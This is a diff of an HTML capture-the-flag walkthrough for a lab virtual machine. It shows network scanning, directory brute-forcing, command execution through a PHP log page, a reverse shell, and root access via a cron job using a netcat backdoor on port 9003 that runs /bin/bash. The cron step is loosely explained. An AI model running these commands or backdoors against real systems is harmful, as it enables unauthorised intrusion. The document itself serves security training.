@@ -29,7 +29,7 @@
 
 <p>First, we used <code>netdiscover</code> to find the IP address of the target VM.</p>
 
-<img src="screenshots/01-netdiscover.png" alt="Netdiscover Output" width="600"/>
+<img src="images/Screenshot%20(160).png" alt="Netdiscover Output" width="600"/>
 
 <h3>Port Scanning</h3>
 
@@ -37,7 +37,7 @@
 
 <pre><code>nmap -sV -sC -T4 -p- 192.168.0.102</code></pre>
 
-<img src="screenshots/02-nmap-full-scan.png" alt="Nmap Scan Output" width="600"/>
+<img src="images/Screenshot%20(161).png" alt="Nmap Scan Output" width="600"/>
 
 <p>This revealed a web server running on port 80.</p>
 
@@ -49,7 +49,7 @@
 
 <p>Accessing <code>http://192.168.0.102</code> presents a default Apache web page.</p>
 
-<img src="screenshots/03-apache-default.png" alt="Apache Default Page" width="600"/>
+<img src="images/Screenshot%20(162).png" alt="Apache Default Page" width="600"/>
 
 <h3>Directory Bruteforce</h3>
 
@@ -57,7 +57,7 @@
 
 <pre><code>gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirb/common.txt</code></pre>
 
-<img src="screenshots/04-gobuster-logfiles.png" alt="Gobuster Results" width="600"/>
+<img src="images/Screenshot%20(165).png" alt="Gobuster Results" width="600"/>
 
 <p>Found <code>/logfiles/</code> directory.</p>
 
@@ -65,7 +65,7 @@
 
 <pre><code>ffuf -u http://192.168.0.102/logfiles/FUZZ -w /usr/share/wordlists/dirb/common.txt</code></pre>
 
-<img src="screenshots/05-ffuf-logs.png" alt="FFUF Results" width="600"/>
+<img src="images/Screenshot%20(167).png" alt="FFUF Results" width="600"/>
 
 <p>This yielded accessible log files.</p>
 
@@ -75,7 +75,7 @@
 
 <p>Examined <code>logfiles/</code> contents and found a <code>.php</code> file containing system commands, suggesting an RCE vulnerability.</p>
 
-<img src="screenshots/06-rce-discovered.png" alt="Log File with RCE" width="600"/>
+<img src="images/Screenshot%20(168).png" alt="Log File with RCE" width="600"/>
 
 <pre><code>curl http://192.168.0.102/logfiles/log.php?cmd=id</code></pre>
 
@@ -85,19 +85,47 @@
 
 <h2 id="privilege-escalation">⬆️ Privilege Escalation</h2>
 
-<p>After spawning a reverse shell using <code>bash -i</code>, privilege escalation was performed via SUID binaries.</p>
+<p>After spawning a reverse shell using <code>bash -i</code>, we found a user named <code>julia</code>. Listing the user flag:</p>
 
-<img src="screenshots/07-suid-check.png" alt="SUID Check" width="600"/>
+<pre><code>cat /home/julia/user.txt</code></pre>
 
-<pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
+<img src="images/Screenshot%20(172).png" alt="User Flag" width="600"/>
 
-<p>Found unusual SUID binary <code>/opt/insomnia/bin/rootme</code>.</p>
+<h3>Examining Crontab for Privilege Escalation</h3>
 
-<pre><code>/opt/insomnia/bin/rootme</code></pre>
+<p>Checked the crontab file to find scheduled tasks that might help escalate privileges:</p>
 
-<img src="screenshots/08-root-shell.png" alt="Root Shell" width="600"/>
+<pre><code>cat /etc/crontab</code></pre>
 
-<p>This granted a root shell.</p>
+<img src="images/Screenshot%20(177).png" alt="Crontab Contents" width="600"/>
+
+<p>Found a cron job running <code>/var/cron/check.sh</code> which requires root privileges.</p>
+
+<h3>Exploiting Cron Job for Root Access</h3>
+
+<p>The <code>check.sh</code> script listens on port <code>9003</code>. We leveraged this to gain root access by creating a backdoor shell on port 9003.</p>
+
+<p>Checked user ID to confirm root privileges:</p>
+
+<pre><code>nohup nc -nlvp 9003 -e /bin/bash &</code></pre>
+
+<pre><code>id</code></pre>
+
+<img src="images/Screenshot%20(180).png" alt="Listening on Port 9003" width="600"/>
+
+<h3>Accessing Root Flag</h3>
+
+<p>Listed root directory to confirm access to the root flag:</p>
+
+<pre><code>ls -al /root/</code></pre>
+
+<img src="images/Screenshot%20(181).png" alt="Listing Root Directory" width="600"/>
+
+<p>Finally, read the root flag:</p>
+
+<pre><code>cat /root/root.txt</code></pre>
+
+<img src="images/Screenshot%20(182).png" alt="Root Flag" width="600"/>
 
 <hr>
 
@@ -105,15 +133,15 @@
 
 <h3>User Flag</h3>
 
-<pre><code>cat /home/insomnia/user.txt</code></pre>
+<pre><code>cat /home/julia/user.txt</code></pre>
 
-<img src="screenshots/09-user-flag.png" alt="User Flag" width="600"/>
+<img src="images/Screenshot%20(172).png" alt="User Flag" width="600"/>
 
 <h3>Root Flag</h3>
 
 <pre><code>cat /root/root.txt</code></pre>
 
-<img src="screenshots/10-root-flag.png" alt="Root Flag" width="600"/>
+<img src="images/Screenshot%20(182).png" alt="Root Flag" width="600"/>
 
 <hr>
 
